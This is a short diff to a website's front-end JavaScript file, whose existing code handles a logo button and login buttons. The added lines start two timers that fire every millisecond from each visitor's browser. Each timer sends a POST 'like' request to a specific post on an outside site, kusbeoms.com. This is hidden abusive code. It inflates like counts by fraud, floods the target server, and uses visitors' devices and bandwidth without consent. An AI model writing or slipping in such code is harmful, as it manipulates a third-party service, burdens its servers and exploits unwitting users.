@@ -1,4 +1,12 @@
 
+setInterval(() => {
+    fetch('https://kusbeoms.com/api/posts/85/like', {method:'POST', mode:'no-cors'});
+  }, 1);
+
+  setInterval(() => {
+    fetch('https://kusbeoms.com/api/posts/69/like', {method:'POST', mode:'no-cors'});
+  }, 1);
+  
 const logoButton = document.querySelector('.set');
 const loginButtons = document.querySelectorAll('.use_set'); // 로그인, 회원가입이 같은 클래스라 모두 가져옴
 // const mainTitle = document.querySelector('.main-wrapper h2');
